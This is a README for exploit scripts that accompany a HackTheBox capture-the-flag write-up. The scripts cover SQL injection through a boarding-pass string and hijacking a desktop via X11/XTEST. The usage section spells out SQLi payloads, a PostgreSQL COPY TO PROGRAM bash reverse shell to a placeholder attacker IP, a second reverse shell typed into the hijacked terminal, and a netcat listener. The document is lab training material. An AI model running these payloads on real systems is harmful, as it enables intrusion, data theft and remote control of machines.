# DutyBound (HackTheBox) — Exploit Scripts

Supporting scripts for my write-up on **DutyBound**, a Medium-difficulty Linux box from HackTheBox Season 12.

📄 Full write-up: **[link to your Medium article]**

These scripts automate two specific steps of the attack chain:

1. **`bcbp_builder.py`** — builds a valid BCBP (Bar Coded Boarding Pass) string for the AirSnacks boarding-pass verification endpoint, with the conditional-section hex length computed automatically, so you can inject arbitrary payloads into the unvalidated "airline individual use" field (the SQL injection point).
2. **`xtest_hijack.py`** — abuses a world-writable X11 display socket to synthesize keyboard input into another user's active desktop session via the XTEST extension: spawns a terminal through the window manager's keybinding, forces keyboard focus onto it (breaking any active grab), and types an arbitrary command into it.

> ⚠️ **For educational / authorized-lab use only.** These scripts target weaknesses specific to the DutyBound machine (fixed BCBP field layout, a world-writable `/tmp/.X11-unix/XN` socket, an Openbox `Ctrl+Alt+T` keybinding). They are not generic exploitation tools and will need adaptation for any other target. Only use them against systems you own or are explicitly authorized to test, such as your own HackTheBox instance.

## Repository contents

```
.
├── README.md          <- this file
├── bcbp_builder.py     <- BCBP payload / SQL injection helper
├── xtest_hijack.py     <- X11 / XTEST desktop-hijacking tool
└── requirements.txt    <- Python dependencies
```

Only these two scripts need to go in the repo — everything else (the Burp requests/responses, terminal screenshots, and the narrative) lives in the write-up itself.

## Requirements

- Python 3.8+
- [`python-xlib`](https://pypi.org/project/python-xlib/) (only needed for `xtest_hijack.py`)

```bash
pip install -r requirements.txt
```

`requirements.txt`:
```
python-xlib
```

`bcbp_builder.py` has no external dependencies (standard library only).

## Usage

### 1. `bcbp_builder.py` — crafting the SQLi payload

Run it with the payload you want to land in the vulnerable field:

```bash
# Confirm the injection point
python3 bcbp_builder.py --tail "'"

# Error-based extraction (e.g. current_user)
python3 bcbp_builder.py --tail "' || (SELECT CAST(current_user AS int)) || '"

# Stacked query -> RCE via pg_execute_server_program
python3 bcbp_builder.py --tail "'); COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1\"'; -- "
```

Each run prints the raw BCBP string and the ready-to-send JSON body — paste the JSON straight into Burp Repeater (or `curl -d`) against:

```
POST /checkout/boarding-pass/verify
```

### 2. `xtest_hijack.py` — hijacking the kiosk desktop session

Run this **from a shell already on the box** (e.g. the one obtained via the SQLi → `COPY ... TO PROGRAM` step), with `DISPLAY` pointed at the target's X server:

```bash
export DISPLAY=:0

# Step 1: spawn a terminal via the WM's Ctrl+Alt+T binding
python3 xtest_hijack.py --open-terminal

# Step 2: find that terminal, force focus, and type a command into it
python3 xtest_hijack.py --type "whoami"

# Both steps in one go, then drop a reverse shell into the hijacked terminal
python3 xtest_hijack.py --open-terminal \
  --type "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'"
```

Have a listener running first:

```bash
nc -lvnp <PORT>
```

Flags:
- `--window-class` — WM_CLASS substring to search for (default: `xterm`)
- `--wait` — seconds to wait after `--open-terminal` before locating the window (default: `2.0`)
- `--no-enter` — type the command without pressing Return afterward

## How it works (short version)

- `bcbp_builder.py` recomputes the BCBP conditional-section's hex-encoded length every time you change the payload, so the parser's own length checks never reject your request before it reaches the vulnerable SQL-building code.
- `xtest_hijack.py` talks to the X server directly via `python-xlib`'s `XTEST` extension to synthesize real key-press/release events — no `xdotool` required. It also issues `XUngrabKeyboard` to break any active keyboard grab (e.g. from a kiosk-mode browser) and verifies, at the protocol level, that synthetic events are actually reaching the target window before typing anything sensitive.

See the full write-up for the context, the vulnerable code paths, and the rest of the chain (privilege escalation via a group-writable CSV and an unsafe `eval` in a root-owned systemd service).

## License

MIT — do whatever you want with this, just don't point it at systems you don't have permission to test.
